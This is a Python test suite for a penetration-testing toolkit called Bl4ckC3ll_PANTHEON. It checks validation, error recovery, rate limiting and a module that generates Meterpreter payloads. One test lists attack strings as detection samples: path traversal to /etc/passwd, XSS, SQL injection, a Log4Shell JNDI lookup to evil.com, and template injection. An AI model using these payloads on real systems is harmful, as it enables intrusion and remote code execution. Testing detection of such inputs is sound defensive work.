#!/usr/bin/env python3
"""
Comprehensive Test Suite for Bl4ckC3ll_PANTHEON
Tests all functions, features, edge cases, and security controls
"""

import sys
import os
import json
import tempfile
import time
import threading
import subprocess
import traceback
import logging
from pathlib import Path
from typing import Dict, List, Any
from datetime import datetime

# Add current directory to path
sys.path.insert(0, str(Path(__file__).parent))

class ComprehensiveTestSuite:
    """Comprehensive testing framework for all components"""
    
    def __init__(self):
        self.test_results = {}
        self.start_time = time.time()
        self.temp_dir = Path(tempfile.mkdtemp(prefix="pantheon_test_"))
        self.test_target = "httpbin.org"  # Safe test target
        
    def log_test(self, test_name: str, status: str, details: str = ""):
        """Log test result"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.test_results[test_name] = {
            "status": status,
            "timestamp": timestamp,
            "details": details
        }
        status_icon = "✅" if status == "PASS" else "❌" if status == "FAIL" else "⚠️"
        print(f"{status_icon} {test_name}: {status}")
        if details:
            print(f"   Details: {details}")
    
    def test_core_imports(self):
        """Test all core module imports"""
        print("\n🔍 Testing Core Module Imports")
        print("-" * 50)
        
        modules_to_test = [
            "bl4ckc3ll_p4nth30n",
            "bcar", 
            "config_validator",
            "error_handler",
            "security_utils",
            "enhanced_validation",
            "enhanced_scanner"
        ]
        
        for module in modules_to_test:
            try:
                __import__(module)
                self.log_test(f"Import {module}", "PASS")
            except ImportError as e:
                self.log_test(f"Import {module}", "FAIL", str(e))
            except Exception as e:
                self.log_test(f"Import {module}", "WARN", f"Unexpected error: {e}")
    
    def test_configuration_validation(self):
        """Test configuration loading and validation"""
        print("\n🔧 Testing Configuration System")
        print("-" * 50)
        
        try:
            import bl4ckc3ll_p4nth30n as main
            
            # Test configuration loading
            cfg = main.load_cfg()
            self.log_test("Configuration Loading", "PASS", f"Loaded {len(cfg)} sections")
            
            # Test configuration validation
            from config_validator import ConfigValidator
            validator = ConfigValidator()
            
            # Test with valid config
            valid_result = validator.validate_config(cfg)
            self.log_test("Valid Config Validation", "PASS" if valid_result["valid"] else "FAIL")
            
            # Test with invalid config
            invalid_cfg = {"limits": {"parallel_jobs": -1, "http_timeout": 99999}}
            invalid_result = validator.validate_config(invalid_cfg)
            self.log_test("Invalid Config Detection", "PASS" if not invalid_result["valid"] else "FAIL")
            
        except Exception as e:
            self.log_test("Configuration System", "FAIL", str(e))
    
    def test_input_validation(self):
        """Test input validation and sanitization"""
        print("\n🛡️ Testing Input Validation & Security")
        print("-" * 50)
        
        try:
            import bl4ckc3ll_p4nth30n as main
            
            # Test domain validation
            test_cases = [
                ("google.com", True),
                ("sub.example.org", True),
                ("invalid..domain", False),
                ("", False),
                ("a" * 300, False),
                ("localhost", True),
                ("192.168.1.1", False)  # IP should fail domain validation
            ]
            
            passed = 0
            for domain, expected in test_cases:
                result = main.validate_domain_input(domain)
                if result == expected:
                    passed += 1
                else:
                    print(f"   Domain validation failed for: {domain}")
            
            self.log_test("Domain Validation", "PASS" if passed == len(test_cases) else "FAIL", 
                         f"{passed}/{len(test_cases)} cases passed")
            
            # Test IP validation
            ip_cases = [
                ("192.168.1.1", True),
                ("10.0.0.1", True),
                ("256.256.256.256", False),
                ("not-an-ip", False),
                ("", False)
            ]
            
            ip_passed = 0
            for ip, expected in ip_cases:
                result = main.validate_ip_input(ip)
                if result == expected:
                    ip_passed += 1
                    
            self.log_test("IP Validation", "PASS" if ip_passed == len(ip_cases) else "FAIL",
                         f"{ip_passed}/{len(ip_cases)} cases passed")
            
        except Exception as e:
            self.log_test("Input Validation", "FAIL", str(e))
    
    def test_error_handling(self):
        """Test error handling and recovery mechanisms"""
        print("\n🚨 Testing Error Handling & Recovery")
        print("-" * 50)
        
        try:
            from error_handler import ErrorRecoveryManager, EnhancedLogger
            
            logger = EnhancedLogger("test")
            recovery = ErrorRecoveryManager(logger)
            
            # Test retry mechanism
            attempt_count = 0
            
            @recovery.retry_with_exponential_backoff(max_retries=3)
            def failing_function():
                nonlocal attempt_count
                attempt_count += 1
                if attempt_count < 3:
                    raise Exception("Temporary failure")
                return "success"
            
            result = failing_function()
            self.log_test("Retry Mechanism", "PASS" if result == "success" and attempt_count == 3 else "FAIL")
            
            # Test circuit breaker
            circuit_failures = 0
            
            @recovery.circuit_breaker(failure_threshold=2)
            def circuit_test():
                nonlocal circuit_failures
                circuit_failures += 1
                if circuit_failures <= 2:
                    raise Exception("Circuit test failure")
                return "success"
            
            # Should fail twice then open circuit
            try:
                for i in range(5):
                    try:
                        circuit_test()
                    except Exception as e:
                        logging.warning(f"Unexpected error: {e}")
                self.log_test("Circuit Breaker", "PASS", "Circuit opened after failures")
            except Exception as e:
                self.log_test("Circuit Breaker", "FAIL", str(e))
                
        except Exception as e:
            self.log_test("Error Handling", "FAIL", str(e))
    
    def test_security_features(self):
        """Test security utilities and controls"""
        print("\n🔒 Testing Security Features")
        print("-" * 50)
        
        try:
            from security_utils import InputValidator, NetworkValidator, RateLimiter
            
            # Test input sanitization
            validator = InputValidator()
            
            # Test malicious input detection
            malicious_inputs = [
                "../../../etc/passwd",
                "<script>alert('xss')</script>",
                "'; DROP TABLE users; --",
                "${jndi:ldap://evil.com/a}",
                "{{7*7}}"
            ]
            
            detected = 0
            for malicious in malicious_inputs:
                if not validator.validate_input(malicious, max_length=100):
                    detected += 1
                    
            self.log_test("Malicious Input Detection", "PASS" if detected >= 4 else "FAIL",
                         f"{detected}/{len(malicious_inputs)} detected")
            
            # Test network validation
            net_validator = NetworkValidator()
            
            # Test private IP detection
            private_ips = ["192.168.1.1", "10.0.0.1", "172.16.0.1"]
            public_ips = ["8.8.8.8", "1.1.1.1"]
            
            private_detected = sum(1 for ip in private_ips if net_validator.is_private_ip(ip))
            public_detected = sum(1 for ip in public_ips if not net_validator.is_private_ip(ip))
            
            self.log_test("Network Classification", 
                         "PASS" if private_detected == len(private_ips) and public_detected == len(public_ips) else "FAIL")
            
            # Test rate limiting
            rate_limiter = RateLimiter(max_requests=3, time_window=1)
            
            # Should allow first 3, then block
            allowed = 0
            blocked = 0
            
            for i in range(5):
                if rate_limiter.is_allowed("test_key"):
                    allowed += 1
                else:
                    blocked += 1
            
            self.log_test("Rate Limiting", "PASS" if allowed == 3 and blocked == 2 else "FAIL",
                         f"Allowed: {allowed}, Blocked: {blocked}")
            
        except Exception as e:
            self.log_test("Security Features", "FAIL", str(e))
    
    def test_core_functions(self):
        """Test core scanning and analysis functions"""
        print("\n⚡ Testing Core Functions")
        print("-" * 50)
        
        try:
            import bl4ckc3ll_p4nth30n as main
            
            # Test certificate transparency search
            ct_results = main.search_certificate_transparency("github.com")
            self.log_test("Certificate Transparency", "PASS" if ct_results and len(ct_results) > 0 else "FAIL",
                         f"Found {len(ct_results) if ct_results else 0} certificates")
            
            # Test configuration functions
            cfg = main.load_cfg()
            
            # Test backup functionality
            backup_result = main.backup_dependencies()
            self.log_test("Dependency Backup", "PASS" if backup_result else "FAIL")
            
            # Test auto-fix functionality
            autofix_result = main.auto_fix_missing_dependencies()
            self.log_test("Auto-fix Dependencies", "PASS" if autofix_result else "WARN", "Some tools may be missing")
            
        except Exception as e:
            self.log_test("Core Functions", "FAIL", str(e))
    
    def test_bcar_integration(self):
        """Test BCAR integration functionality"""
        print("\n🤖 Testing BCAR Integration")
        print("-" * 50)
        
        try:
            import bl4ckc3ll_p4nth30n as main
            
            if main.BCAR_AVAILABLE:
                from bcar import PantheonBCARIntegration
                
                integration = PantheonBCARIntegration()
                
                # Test payload generation
                payloads = integration.generate_meterpreter_payloads("127.0.0.1", 4444)
                self.log_test("BCAR Payload Generation", "PASS" if payloads else "FAIL")
                
                # Test reconnaissance integration
                recon_data = integration.enhanced_reconnaissance("example.com")
                self.log_test("BCAR Reconnaissance", "PASS" if recon_data else "FAIL")
                
                self.log_test("BCAR Integration", "PASS", "All BCAR functions operational")
            else:
                self.log_test("BCAR Integration", "WARN", "BCAR module not available")
                
        except Exception as e:
            self.log_test("BCAR Integration", "FAIL", str(e))
    
    def test_resource_management(self):
        """Test resource usage and management"""
        print("\n📊 Testing Resource Management")
        print("-" * 50)
        
        try:
            import psutil
            import bl4ckc3ll_p4nth30n as main
            
            # Test system monitoring
            initial_memory = psutil.Process().memory_info().rss
            
            # Run some operations
            cfg = main.load_cfg()
            ct_results = main.search_certificate_transparency("example.com")
            
            final_memory = psutil.Process().memory_info().rss
            memory_increase = final_memory - initial_memory
            
            # Memory increase should be reasonable (less than 50MB for basic operations)
            self.log_test("Memory Usage", "PASS" if memory_increase < 50 * 1024 * 1024 else "WARN",
                         f"Memory increase: {memory_increase // 1024} KB")
            
            # Test CPU usage
            cpu_percent = psutil.Process().cpu_percent(interval=1)
            self.log_test("CPU Usage", "PASS" if cpu_percent < 50 else "WARN", f"CPU: {cpu_percent}%")
            
        except Exception as e:
            self.log_test("Resource Management", "FAIL", str(e))
    
    def test_edge_cases(self):
        """Test edge cases and error conditions"""
        print("\n🎯 Testing Edge Cases")
        print("-" * 50)
        
        try:
            import bl4ckc3ll_p4nth30n as main
            
            # Test with empty/invalid inputs
            edge_cases = [
                ("", "empty string"),
                (None, "none value"),
                ("a" * 1000, "very long string"),
                ("localhost", "localhost"),
                ("0.0.0.0", "null IP"),
                ("255.255.255.255", "broadcast IP")
            ]
            
            robust_functions = 0
            total_tests = 0
            
            for test_input, description in edge_cases:
                total_tests += 1
                try:
                    # Test domain validation with edge case
                    if isinstance(test_input, str):
                        result = main.validate_domain_input(test_input)
                        robust_functions += 1  # If no exception, function is robust
                except Exception as e:
                    print(f"   Edge case failed: {description} - {e}")
            
            self.log_test("Edge Case Robustness", 
                         "PASS" if robust_functions >= total_tests * 0.8 else "WARN",
                         f"{robust_functions}/{total_tests} tests handled gracefully")
            
        except Exception as e:
            self.log_test("Edge Cases", "FAIL", str(e))
    
    def test_concurrent_operations(self):
        """Test concurrent operation handling"""
        print("\n🔄 Testing Concurrent Operations")
        print("-" * 50)
        
        try:
            import bl4ckc3ll_p4nth30n as main
            import threading
            
            results = []
            errors = []
            
            def worker_function(worker_id):
                try:
                    # Each worker performs some operations
                    cfg = main.load_cfg()
                    ct_results = main.search_certificate_transparency(f"worker{worker_id}.com")
                    results.append(f"Worker {worker_id} completed")
                except Exception as e:
                    errors.append(f"Worker {worker_id} failed: {e}")
            
            # Start multiple workers
            threads = []
            for i in range(5):
                thread = threading.Thread(target=worker_function, args=(i,))
                threads.append(thread)
                thread.start()
            
            # Wait for completion
            for thread in threads:
                thread.join(timeout=10)
            
            self.log_test("Concurrent Operations", 
                         "PASS" if len(errors) == 0 else "WARN",
                         f"Completed: {len(results)}, Errors: {len(errors)}")
            
        except Exception as e:
            self.log_test("Concurrent Operations", "FAIL", str(e))
    
    def test_performance_benchmarks(self):
        """Test performance benchmarks"""
        print("\n⚡ Testing Performance Benchmarks")
        print("-" * 50)
        
        try:
            import bl4ckc3ll_p4nth30n as main
            
            # Benchmark configuration loading
            start_time = time.time()
            for i in range(10):
                cfg = main.load_cfg()
            config_time = (time.time() - start_time) / 10
            
            self.log_test("Config Load Performance", 
                         "PASS" if config_time < 0.1 else "WARN",
                         f"Average: {config_time:.3f}s per load")
            
            # Benchmark certificate transparency search
            start_time = time.time()
            ct_results = main.search_certificate_transparency("github.com")
            ct_time = time.time() - start_time
            
            self.log_test("CT Search Performance",
                         "PASS" if ct_time < 5.0 else "WARN",
                         f"Time: {ct_time:.3f}s")
            
        except Exception as e:
            self.log_test("Performance Benchmarks", "FAIL", str(e))
    
    def run_comprehensive_tests(self):
        """Run all comprehensive tests"""
        print("🎯 BL4CKCE3LL PANTHEON COMPREHENSIVE TEST SUITE")
        print("=" * 80)
        print(f"Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"Test Directory: {self.temp_dir}")
        print()
        
        test_methods = [
            self.test_core_imports,
            self.test_configuration_validation,
            self.test_input_validation,
            self.test_error_handling,
            self.test_security_features,
            self.test_core_functions,
            self.test_bcar_integration,
            self.test_resource_management,
            self.test_edge_cases,
            self.test_concurrent_operations,
            self.test_performance_benchmarks
        ]
        
        for test_method in test_methods:
            try:
                test_method()
            except Exception as e:
                print(f"❌ TEST METHOD FAILED: {test_method.__name__}")
                print(f"   Error: {e}")
                print(f"   Traceback: {traceback.format_exc()}")
        
        self.generate_summary_report()
    
    def generate_summary_report(self):
        """Generate comprehensive test summary"""
        print("\n" + "=" * 80)
        print("📋 COMPREHENSIVE TEST SUMMARY")
        print("=" * 80)
        
        total_tests = len(self.test_results)
        passed = sum(1 for r in self.test_results.values() if r["status"] == "PASS")
        failed = sum(1 for r in self.test_results.values() if r["status"] == "FAIL")
        warnings = sum(1 for r in self.test_results.values() if r["status"] == "WARN")
        
        print(f"Total Tests: {total_tests}")
        print(f"✅ Passed: {passed}")
        print(f"❌ Failed: {failed}")
        print(f"⚠️ Warnings: {warnings}")
        print(f"Success Rate: {(passed/total_tests)*100:.1f}%")
        
        elapsed_time = time.time() - self.start_time
        print(f"Elapsed Time: {elapsed_time:.1f}s")
        
        # Detailed results
        print(f"\n📊 DETAILED RESULTS:")
        print("-" * 50)
        for test_name, result in self.test_results.items():
            status_icon = "✅" if result["status"] == "PASS" else "❌" if result["status"] == "FAIL" else "⚠️"
            print(f"{status_icon} {test_name:<35} {result['status']}")
            if result.get("details"):
                print(f"     └── {result['details']}")
        
        # Generate recommendations
        print(f"\n💡 RECOMMENDATIONS:")
        print("-" * 30)
        if failed > 0:
            print("🔧 Address failed tests to improve system reliability")
        if warnings > 0:
            print("⚠️ Review warnings for potential optimizations")
        
        security_score = (passed / total_tests) * 100
        if security_score >= 90:
            print("🎉 EXCELLENT: System is highly robust and secure")
        elif security_score >= 75:
            print("✅ GOOD: System is stable with minor issues")
        elif security_score >= 60:
            print("⚠️ NEEDS ATTENTION: Several issues need resolution")
        else:
            print("❌ CRITICAL: System needs significant improvements")
        
        # Save detailed report
        report_file = self.temp_dir / "comprehensive_test_report.json"
        with open(report_file, 'w') as f:
            json.dump({
                "summary": {
                    "total": total_tests,
                    "passed": passed,
                    "failed": failed,
                    "warnings": warnings,
                    "success_rate": (passed/total_tests)*100,
                    "elapsed_time": elapsed_time
                },
                "results": self.test_results
            }, f, indent=2)
        
        print(f"\n📄 Detailed report saved to: {report_file}")
        print(f"🗂️ Test artifacts in: {self.temp_dir}")

def main():
    """Main test runner"""
    test_suite = ComprehensiveTestSuite()
    test_suite.run_comprehensive_tests()
    return 0

if __name__ == "__main__":
    sys.exit(main())